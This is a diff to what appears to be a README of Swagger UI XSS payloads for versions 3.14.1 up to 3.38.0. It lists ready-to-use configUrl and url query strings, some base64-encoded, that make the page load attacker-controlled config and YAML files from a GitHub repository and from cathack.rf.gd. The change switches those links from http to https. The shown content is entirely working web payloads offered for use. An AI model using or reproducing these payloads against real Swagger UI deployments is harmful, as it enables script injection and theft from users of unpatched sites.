@@ -8,10 +8,10 @@ Swagger UI version affected: `>=3.14.1` &lt; `3.38.0`
 3. `?configUrl=https://raw.githubusercontent.com/aydilfahri/swagger-ui-xss/main/config.json`
 4. `?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
 5. `/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5ZGlsZmFocmkvc3dhZ2dlci11aS14c3MvbWFpbi94c3MtZmV0Y2gueWFtbCIKfQ==`
-6. `?configUrl=http://cathack.rf.gd/config.json`
-7. `?configUrl=http://cathack.rf.gd/test.json`
-8. `?url=http://cathack.rf.gd/test.yaml`
-9. `?url=http://cathack.rf.gd/fetch.yaml`
+6. `?configUrl=https://cathack.rf.gd/config.json`
+7. `?configUrl=https://cathack.rf.gd/test.json`
+8. `?url=https://cathack.rf.gd/test.yaml`
+9. `?url=https://cathack.rf.gd/fetch.yaml`
 
 
 
